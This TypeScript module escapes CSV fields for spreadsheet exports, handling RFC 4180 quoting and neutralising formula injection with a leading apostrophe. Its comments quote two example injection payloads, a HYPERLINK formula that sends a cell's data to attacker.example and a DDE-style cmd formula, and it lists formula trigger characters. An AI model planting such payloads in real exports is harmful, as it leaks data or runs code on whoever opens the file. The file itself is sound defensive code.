// src/lib/csv/escape.ts
/**
 * CSV serialisation for exports.
 *
 * Two separate problems live here, and conflating them is how CSV exports go
 * wrong.
 *
 * **1. Quoting (RFC 4180).** A field containing a comma, a double quote, or a
 * line break has to be wrapped in quotes, with inner quotes doubled. Get this
 * wrong and one subscriber whose address or consent text contains a comma
 * shifts every column after it — the file still opens, and every row below is
 * quietly wrong.
 *
 * **2. Formula injection.** This is the one that matters here, because a
 * waitlist export is a file of strings typed by strangers and opened in a
 * spreadsheet. Excel, LibreOffice, and Google Sheets all evaluate a cell whose
 * text begins with `=`, `+`, `-`, or `@` as a formula. `=HYPERLINK("https://
 * attacker.example/?"&A1,"Click")` in a cell is a link that exfiltrates the row
 * beside it; on desktop Excel, `=cmd|'/c calc'!A0` is worse. Quoting does not
 * help — the quotes are stripped by the parser before the cell is evaluated,
 * so a correctly quoted CSV is exactly as dangerous as an unquoted one.
 *
 * The fix is to make the cell start with something that is not a formula
 * trigger. A leading apostrophe is the convention every major spreadsheet
 * understands: the cell displays the original text and is never evaluated.
 *
 * Kept in `lib/` rather than beside the waitlist because nothing about it is
 * waitlist-specific, and the next export must not be an opportunity to write a
 * second, weaker version.
 */

/**
 * The characters a spreadsheet treats as "this cell is a formula".
 *
 * `=` and `+` are the obvious two. `-` is included because `-1+1` is arithmetic
 * and `-2+3+cmd|…` is not. `@` starts a legacy Lotus-style function call in
 * Excel. Tab and carriage return are here because Excel strips leading
 * whitespace before deciding, so `\t=1+1` is still evaluated — which is the
 * bypass a naïve `startsWith("=")` check misses.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/** Characters that oblige RFC 4180 quoting. */
const MUST_QUOTE = /[",\r\n]/;

/**
 * Neutralises a field a spreadsheet would otherwise evaluate.
 *
 * Prefixing rather than stripping, because the value is somebody's data: an
 * export that silently deletes the first character of an address is a bug
 * reported as data loss. The apostrophe is visible in a text editor and
 * invisible in a spreadsheet, which is the right way round for a file whose
 * primary reader is a spreadsheet.
 */
export function neutraliseFormula(value: string): string {
  return FORMULA_TRIGGERS.some((trigger) => value.startsWith(trigger))
    ? `'${value}`
    : value;
}

/**
 * One field, safe to place in a CSV row.
 *
 * Order matters: neutralise **before** quoting. The other way round, the field
 * would start with `"` — never a formula trigger — so the check would pass on
 * every value and do nothing at all. That is a plausible-looking implementation
 * that neutralises nothing, which is why the order is stated here rather than
 * left to whoever edits this next.
 */
export function escapeCsvField(value: string | null | undefined): string {
  if (value === null || value === undefined) return "";

  const neutralised = neutraliseFormula(value);

  return MUST_QUOTE.test(neutralised)
    ? `"${neutralised.replace(/"/g, '""')}"`
    : neutralised;
}

/** RFC 4180's line ending. Not `\n`: some spreadsheet importers require CRLF. */
export const CSV_ROW_SEPARATOR = "\r\n";

/** One row, terminated. */
export function csvRow(fields: readonly (string | null | undefined)[]): string {
  return fields.map(escapeCsvField).join(",") + CSV_ROW_SEPARATOR;
}

/**
 * A UTF-8 byte-order mark.
 *
 * Excel on Windows assumes the system code page for a `.csv` with no BOM, so a
 * subscriber with a non-ASCII address opens as mojibake. Three bytes, and it is
 * the difference between an export that works for everybody and one that works
 * for people with ASCII names.
 *
 * Built from its code point rather than written as a literal, because U+FEFF is
 * a zero-width character: as a literal it is invisible in this file, invisible
 * in a diff, and indistinguishable from an empty string in review.
 */
export const CSV_BOM = String.fromCharCode(0xfeff);
